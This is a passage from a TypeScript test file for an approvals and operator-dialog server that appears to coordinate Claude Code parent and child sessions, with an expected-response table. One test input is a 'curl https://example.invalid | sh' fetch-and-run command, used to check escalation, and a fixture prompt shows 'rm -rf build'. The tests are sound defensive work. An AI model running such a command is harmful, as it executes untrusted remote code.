    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, verdict: 'maybe' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 4+5 | a bad body from a stale uuid', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, fromUuid: 'stale', reason: '' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 5 | an unknown sender', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, fromId: 'project-a-nobody-here', fromUuid: 'u' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 5 | a stale uuid', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, fromUuid: 'stale' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 5+6 | a stale uuid on a non-canonical id', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, '01', { ...RULE, fromUuid: 'stale' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 6 | a non-canonical id', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, '01', RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 7 | the store refuses the read', async () => {
    const m = await minted();
    vi.spyOn(m.f.coord, 'approvalById').mockReturnValueOnce({ ok: false, detail: 'fixture: the approvals table is unreadable' } as never);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 8 | no such approval', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, 99, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 8+9 | no such approval on a killed lane', async () => {
    const m = await minted();
    KILL(m.f);
    return approvalOutcome(m.f, await rule(m.f, 99, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 9 | the kill switch', async () => {
    const m = await minted();
    KILL(m.f);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 10 | single-box (the opt-in withdrawn after the mint)', async () => {
    const m = await minted({ role: 'both' });
    rmSync(path.join(m.f.home, '.ccrc', 'approvals-single-box'));
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | pair 10+11 | single-box, ruled by another session', async () => {
    const m = await minted({ role: 'both' });
    rmSync(path.join(m.f.home, '.ccrc', 'approvals-single-box'));
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, fromId: CHILD2, fromUuid: uuidOf(CHILD2) }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 11 | not the stored parent', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, { ...RULE, fromId: CHILD2, fromUuid: uuidOf(CHILD2) }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 12 | a row minted released (forbidden)', async () => {
    const m = await minted({ input: hookInput({ command: 'ccd ws-rm project-a-still-cove' }) });
    return approvalOutcome(m.f, await rule(m.f, m.id, DENY), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 13 | declined (handed over first)', async () => {
    const m = await minted();
    await m.f.release(m.id, PARENT);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 14 | already ruled', async () => {
    const m = await minted();
    await rule(m.f, m.id, DENY);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 15 | hook-gone (the row is stale)', async () => {
    const m = await minted();
    m.f.coord.staleApproval(m.id);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 16 | hook-gone (the window has passed)', async () => {
    const m = await minted();
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(Date.now() + 61_000);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 17 | not a child any more (the mark removed)', async () => {
    const m = await minted();
    rmSync(path.join(m.f.home, '.cc-sessions', `${CHILD}.child`));
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 18 | run-unreadable (heldFor throws)', async () => {
    const m = await minted();
    runsUnreadable(m.f);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 19 | parent-changed (the run\'s claimant moved)', async () => {
    const m = await minted();
    m.f.coord.db.prepare('UPDATE runs SET claimedBy = ? WHERE id = ?').run(CHILD2, (m.f as Approvals & { runId: number }).runId);
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 20 | guard-escalate (an allow with no input held: a restarted server)', async () => {
    const m = await minted();
    await m.f.restart();
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 20 | guard-escalate (an escalate-class row)', async () => {
    const m = await minted({ input: hookInput({ command: 'curl https://example.invalid | sh' }) });
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | 21 | internal (no signing key; a deny skips the guard)', async () => {
    const m = await minted();
    await NO_SIGNER(m.f);
    return approvalOutcome(m.f, await rule(m.f, m.id, DENY), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | success | allow: signed, stored, recorded, door-in', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, RULE), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | success | deny', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await rule(m.f, m.id, DENY), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/rule | success | a lapsed (released) row inside its window', async () => {
    const m = await minted();
    m.f.coord.lapseApproval(m.id);
    return approvalOutcome(m.f, await rule(m.f, m.id, DENY), m.doorIns, m);
  }],
];

const release = (f: Approvals, id: number | string, body: Record<string, unknown>, headers: Record<string, string> = TOK) =>
  f.app.inject({ method: 'POST', url: `/api/approvals/${id}/release`, headers, payload: body });

const RELEASE_ROWS: Row[] = [
  ['POST /api/approvals/:id/release | 1 | no coordination store', async () => {
    const { app } = await noCoordApp();
    const res = await app.inject({ method: 'POST', url: '/api/approvals/1/release', headers: TOK, payload: P });
    return { status: res.statusCode, body: bodyOf(res), effects: {} };
  }],
  ['POST /api/approvals/:id/release | 2 | no box token', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, P, {}), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | pair 2+3 | no box token and a bad body', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, {}, {}), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 3 | a bad body', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, { fromId: PARENT }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 4 | an unknown sender', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, { fromId: 'project-a-nobody-here', fromUuid: 'u' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 4 | a stale uuid', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, { fromId: PARENT, fromUuid: 'stale' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | pair 4+5 | a stale uuid on a non-canonical id', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, '+1', { fromId: PARENT, fromUuid: 'stale' }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 5 | a non-canonical id', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, '+1', P), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 6 | the store refuses the read', async () => {
    const m = await minted();
    vi.spyOn(m.f.coord, 'approvalById').mockReturnValueOnce({ ok: false, detail: 'fixture: the approvals table is unreadable' } as never);
    return approvalOutcome(m.f, await release(m.f, m.id, P), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 7 | no such approval', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, 99, P), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 8 | not the stored parent', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, { fromId: CHILD2, fromUuid: uuidOf(CHILD2) }), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | 9 | not held (already ruled)', async () => {
    const m = await minted();
    await rule(m.f, m.id, DENY);
    return approvalOutcome(m.f, await release(m.f, m.id, P), m.doorIns, m);
  }],
  ['POST /api/approvals/:id/release | success | declined, and the door-in fires', async () => {
    const m = await minted();
    return approvalOutcome(m.f, await release(m.f, m.id, P), m.doorIns, m);
  }],
];

// ── The operator's doors ─────────────────────────────────────────────────────────────────────────────────────────

const opAsk = (f: { inject: Approvals['app']['inject'] }, id: string, body: unknown) =>
  f.inject({ method: 'POST', url: `/api/sessions/${id}/ask`, payload: body as Record<string, unknown> });
const op = (f: Approvals, url: string, body: unknown) => f.app.inject({ method: 'POST', url, payload: body as Record<string, unknown> });

/** One operator row: the response, the ask row (when one was minted), keys pressed into the child's pane, feed rows. */
const keysOf = (_f: Approvals): string[] => [...KEYS];
const opOutcome = (s: Awaited<ReturnType<typeof askFixture>>, res: LightMyRequestResponse): Outcome => ({
  status: res.statusCode, body: bodyOf(res),
  effects: {
    row: s.id === -1 ? null : askRow(s.f, s.id), keys: keysOf(s.f),
    feed: feedTitles(s.f).slice(0, s.f.coord.feedEvents(50).length - s.feed0),
  },
});

const OP_ASK_ROWS: Row[] = [
  ['POST /api/sessions/:id/ask | 1 | an unknown session', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, 'project-a-nobody-here', { askKey: ASK_KEY, optionIndexes: [0] }));
  }],
  ['POST /api/sessions/:id/ask | pair 1+2 | an unknown session and a bad body', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, 'project-a-nobody-here', { optionIndexes: [0] }));
  }],
  ['POST /api/sessions/:id/ask | 2 | no askKey', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, CHILD, { optionIndexes: [0] }));
  }],
  ['POST /api/sessions/:id/ask | 2 | optionIndexes not numbers', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [true] }));
  }],
  ['POST /api/sessions/:id/ask | no coord | the press goes through plain', async () => {
    const { app } = await noCoordApp();
    const res = await opAsk(app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] });
    return { status: res.statusCode, body: bodyOf(res), effects: { keys: [...KEYS] } };
  }],
  ['POST /api/sessions/:id/ask | nothing held | the press goes through, nothing recorded', async () => {
    const s = await askFixture({ mint: 'none' });
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
  ['POST /api/sessions/:id/ask | held and taken | answered by the operator, recorded', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
  ['POST /api/sessions/:id/ask | held, press refused | the take is rolled back, 409', async () => {
    const s = await askFixture();
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [5] }));
  }],
  ['POST /api/sessions/:id/ask | CAS lost | the ask moved: the press still goes through, the row untouched', async () => {
    const s = await askFixture();
    hookstate(s.f, CHILD, s.now + 5);
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
  ['POST /api/sessions/:id/ask | CAS lost, press refused | 409 with the press\'s word, the row untouched', async () => {
    const s = await askFixture();
    hookstate(s.f, CHILD, s.now + 5);
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [5] }));
  }],
  ['POST /api/sessions/:id/ask | store refuses | the operator\'s press goes through unrecorded', async () => {
    const s = await askFixture();
    vi.spyOn(s.f.coord, 'heldAskFor').mockReturnValue({ ok: false, detail: 'fixture: the asks table is unreadable' } as never);
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
  ['POST /api/sessions/:id/ask | store throws | the operator\'s press goes through unrecorded', async () => {
    const s = await askFixture();
    vi.spyOn(s.f.coord, 'heldAskFor').mockImplementation(() => { throw new Error('fixture: disk I/O error'); });
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
  ['POST /api/sessions/:id/ask | the take throws | the operator\'s press goes through unrecorded', async () => {
    const s = await askFixture();
    vi.spyOn(s.f.coord, 'takeAskForAnswer').mockImplementation(() => { throw new Error('fixture: disk I/O error'); });
    return opOutcome(s, await opAsk(s.f.app, CHILD, { askKey: ASK_KEY, optionIndexes: [1] }));
  }],
];

// A permission prompt the operator answers with a digit, and the ask screens the other dialog doors read.
const PERMISSION_PANE = 'Bash command\n\n  rm -rf build\n\n  Do you want to proceed?\n'
  + "❯ 1. Yes\n  2. Yes, and don't ask again for rm commands\n  3. No, and tell Claude what to do differently\n\nEnter to confirm\n";
const idOf = (pane: string): string => parseDialog(pane)!.id;

const dialogFixture = async (panes: string[]) => {
  const s = await askFixture({ mint: 'none' });
  script(s.f, CHILD, panes);
  return s;
};
/** The approval rows of the child and the keys, for the `/dialog` door's approval marking (before the key). */
const dialogOutcome = (s: Awaited<ReturnType<typeof askFixture>>, res: LightMyRequestResponse, rowId: number | null = null): Outcome => ({
  status: res.statusCode, body: bodyOf(res),
  effects: { keys: keysOf(s.f), ...(rowId === null ? {} : { approval: approvalRow(s.f, rowId) }) },
});

/** The store's operator marking, recorded in `KEYS` (calling through), so a row shows whether it ran and before which key. */
const markInKeys = (f: Approvals): void => {
  const real = f.coord.markApprovalOperator.bind(f.coord);
  vi.spyOn(f.coord, 'markApprovalOperator').mockImplementation(((id: string, at: number) => { KEYS.push(`${id} <markApprovalOperator>`); return real(id, at); }) as never);
};

const OP_DIALOG_ROWS: Row[] = [
  ['POST /api/sessions/:id/dialog | 1 | an unknown session', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    return dialogOutcome(s, await op(s.f, '/api/sessions/project-a-nobody-here/dialog', { dialogId: idOf(PERMISSION_PANE), optionIndex: 1 }));
  }],
  ['POST /api/sessions/:id/dialog | 2 | a bad body', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: 7, optionIndex: 1 }));
  }],
  ['POST /api/sessions/:id/dialog | press refused | another dialog id: 409, nothing pressed', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: 'not-this-one', optionIndex: 1 }));
  }],
  ['POST /api/sessions/:id/dialog | success | the cursor\'s row confirmed with Enter', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: idOf(PERMISSION_PANE), optionIndex: 1 }));
  }],
  ['POST /api/sessions/:id/dialog | approval marking | a held approval row is marked operator before the key, even when the press refuses', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    expect((await s.f.request(requestBody(ORDINARY))).statusCode).toBe(201);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: 'not-this-one', optionIndex: 1 }), 1);
  }],
  // The hookstate gate: with the watcher holding the child's hookstate, only an approval envelope marks the rows. An
  // operator's answer to an AskUserQuestion leaves a claimant's held approval row held (principals do not cross).
  ['POST /api/sessions/:id/dialog | approval marking | the hookstate is an AskUserQuestion: the held approval row stays held', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    await s.f.watcher.tick();
    expect('questions' in (s.f.watcher.currentHookStates().get(CHILD)?.ask ?? {})).toBe(true);
    expect((await s.f.request(requestBody(ORDINARY))).statusCode).toBe(201);
    markInKeys(s.f);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: idOf(PERMISSION_PANE), optionIndex: 1 }), 1);
  }],
  ['POST /api/sessions/:id/dialog | approval marking | the hookstate is an approval: the held approval row is marked operator before the key', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    hookstate(s.f, CHILD, s.now, { approval: { tool: 'Bash', summary: 'rm -rf build' } });
    await s.f.watcher.tick();
    expect('approval' in (s.f.watcher.currentHookStates().get(CHILD)?.ask ?? {})).toBe(true);
    expect((await s.f.request(requestBody(ORDINARY))).statusCode).toBe(201);
    markInKeys(s.f);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: idOf(PERMISSION_PANE), optionIndex: 1 }), 1);
  }],
  ['POST /api/sessions/:id/dialog | approval marking | the store throws: answered anyway', async () => {
    const s = await dialogFixture([PERMISSION_PANE]);
    vi.spyOn(s.f.coord, 'markApprovalOperator').mockImplementation(() => { throw new Error('fixture: disk I/O error'); });
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog`, { dialogId: idOf(PERMISSION_PANE), optionIndex: 1 }));
  }],
];

const SAME_LABELS_Q2 = fixture('cc300-ask-same-labels-q2');
const FOCUSED = fixture('cc300-ask-freetext-walk-2-focused');
const TYPED = fixture('cc300-ask-freetext-walk-3-typed');
const TEXT = '- only in staging, sampled 10%';
const TOOLS_OPEN = fixture('cc300-ask-multiselect-tools-open');
const TOOLS_2_1 = fixture('cc300-ask-multiselect-tools-revisit-digit2-1');
const SIZES_OPEN = fixture('cc300-ask-multiselect-sizes-open');
const REVIEW_296 = fixture('cc296-ask-2q-long-review');

const OP_TEXT_MULTI_TAB_ROWS: Row[] = [
  ['POST /api/sessions/:id/dialog/text | 1 | an unknown session', async () => {
    const s = await dialogFixture([SAME_LABELS_Q2]);
    return dialogOutcome(s, await op(s.f, '/api/sessions/project-a-nobody-here/dialog/text', { dialogId: idOf(SAME_LABELS_Q2), optionIndex: 3, text: TEXT }));
  }],
  ['POST /api/sessions/:id/dialog/text | 2 | a bad body (no text)', async () => {
    const s = await dialogFixture([SAME_LABELS_Q2]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/text`, { dialogId: idOf(SAME_LABELS_Q2), optionIndex: 3 }));
  }],
  ['POST /api/sessions/:id/dialog/text | press refused | bad-text is a 400', async () => {
    const s = await dialogFixture([SAME_LABELS_Q2]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/text`, { dialogId: idOf(SAME_LABELS_Q2), optionIndex: 3, text: '   ' }));
  }],
  ['POST /api/sessions/:id/dialog/text | press refused | another dialog id is a 409', async () => {
    const s = await dialogFixture([SAME_LABELS_Q2]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/text`, { dialogId: 'not-this-one', optionIndex: 3, text: TEXT }));
  }],
  ['POST /api/sessions/:id/dialog/text | success | walked, proved, typed, echoed, Enter', async () => {
    const s = await dialogFixture([SAME_LABELS_Q2, FOCUSED, TYPED]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/text`, { dialogId: idOf(SAME_LABELS_Q2), optionIndex: 3, text: TEXT }));
  }],
  ['POST /api/sessions/:id/dialog/multi | 1 | an unknown session', async () => {
    const s = await dialogFixture([TOOLS_OPEN]);
    return dialogOutcome(s, await op(s.f, '/api/sessions/project-a-nobody-here/dialog/multi', { dialogId: idOf(TOOLS_OPEN), optionIndexes: [3, 1] }));
  }],
  ['POST /api/sessions/:id/dialog/multi | 2 | a bad body', async () => {
    const s = await dialogFixture([TOOLS_OPEN]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/multi`, { dialogId: idOf(TOOLS_OPEN), optionIndexes: ['1'] }));
  }],
  ['POST /api/sessions/:id/dialog/multi | press refused | bad-indexes is a 400', async () => {
    const s = await dialogFixture([TOOLS_OPEN]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/multi`, { dialogId: idOf(TOOLS_OPEN), optionIndexes: [1, 1] }));
  }],
  ['POST /api/sessions/:id/dialog/multi | press refused | another dialog id is a 409', async () => {
    const s = await dialogFixture([TOOLS_OPEN]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/multi`, { dialogId: 'not-this-one', optionIndexes: [3, 1] }));
  }],
  ['POST /api/sessions/:id/dialog/multi | success | ticked in order, proved, Tab, the next screen back', async () => {
    const s = await dialogFixture([TOOLS_OPEN, TOOLS_2_1, SIZES_OPEN]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/multi`, { dialogId: idOf(TOOLS_OPEN), optionIndexes: [3, 1] }));
  }],
  ['POST /api/sessions/:id/dialog/tab | 1 | an unknown session', async () => {
    const s = await dialogFixture([REVIEW_296]);
    return dialogOutcome(s, await op(s.f, '/api/sessions/project-a-nobody-here/dialog/tab', { dialogId: idOf(REVIEW_296), to: 'submit' }));
  }],
  ['POST /api/sessions/:id/dialog/tab | press refused | a bad body is a 400', async () => {
    const s = await dialogFixture([REVIEW_296]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/tab`, { to: 'sideways' }));
  }],
  ['POST /api/sessions/:id/dialog/tab | press refused | another dialog id is a 409', async () => {
    const s = await dialogFixture([REVIEW_296]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/tab`, { dialogId: 'not-this-one', to: 'submit' }));
  }],
  ['POST /api/sessions/:id/dialog/tab | success | already on the review: the screen back, nothing pressed', async () => {
    const s = await dialogFixture([REVIEW_296]);
    return dialogOutcome(s, await op(s.f, `/api/sessions/${CHILD}/dialog/tab`, { dialogId: idOf(REVIEW_296), to: 'submit' }));
  }],
];

const ALL_ROWS: Row[] = [
  ...ASK_ANSWER_ROWS, ...ASK_RELEASE_ROWS, ...RAISE_ROWS, ...RULE_ROWS, ...RELEASE_ROWS,
  ...OP_ASK_ROWS, ...OP_DIALOG_ROWS, ...OP_TEXT_MULTI_TAB_ROWS,
];

// ── The expectations: today's answers, recorded on the base ────────────────────────────────────────────────────

const EXPECTED: Record<string, Outcome> = {
  "POST /api/asks/:id/answer | 1 | no coordination store":
    {"status": 501, "body": "{\"ok\":false,\"error\":\"not-configured\"}", "effects": {}},
  "POST /api/asks/:id/answer | 2 | no box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/asks/:id/answer grants no legacy tolerance\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 2 | a wrong box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"wrong box token\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | pair 2+3 | no box token and a bad body":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/asks/:id/answer grants no legacy tolerance\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 3 | a bad body (optionIndexes not numbers)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, optionIndexes an array of numbers, askKey a string when given\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 3 | a bad body (askKey not a string)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, optionIndexes an array of numbers, askKey a string when given\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | pair 3+4 | a bad body from an unknown sender":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, optionIndexes an array of numbers, askKey a string when given\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 4 | an unknown sender":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"unknown-sender\",\"detail\":\"no registry row for project-a-nobody-here\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 4 | a stale uuid":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | pair 4+5 | a stale uuid on a non-canonical id":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 5 | a non-canonical id":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 6 | the store refuses the read":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"ask-unreadable\",\"detail\":\"fixture: the asks table is unreadable\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 7 | no such ask":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-ask\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 8 | not the stored parent":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"not-parent\",\"detail\":\"only this child's derived parent may pre-empt its question\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | pair 8+9 | not the stored parent, on a row minted released":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"not-parent\",\"detail\":\"only this child's derived parent may pre-empt its question\"}", "effects": {"row": {"state": "released", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 9 | a row minted released":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-held\"}", "effects": {"row": {"state": "released", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 10 | another askKey":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"ask-mismatch\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 11 | the child unmeasurable (no hookstate)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"child-unmeasurable\",\"detail\":\"this box could not read the child's live state — nothing was pressed, and the ask is unchanged\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 12 | the CAS lost: the ask moved":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"ask-moved\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 12 | the CAS lost: declined":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"declined\"}", "effects": {"row": {"state": "declined", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 12 | the CAS lost: already answered":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"already-answered\"}", "effects": {"row": {"state": "answered", "answeredBy": "operator", "answer": "Red"}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 12 | the CAS lost: already answering":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-held\"}", "effects": {"row": {"state": "answering", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | 13 | the press refused (out of range): the take is rolled back":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"range\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/answer | success | a held ask: pressed, recorded, settled, no late replace":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "answered", "answeredBy": "project-a-calm-mesa", "answer": "Blue"}, "doorIns": [], "keys": ["project-a-quiet-basin 2"], "feed": ["question answered"], "pushes": []}},
  "POST /api/asks/:id/answer | success | after the lapse released it: the late answer replaces the lapse (D-5289)":
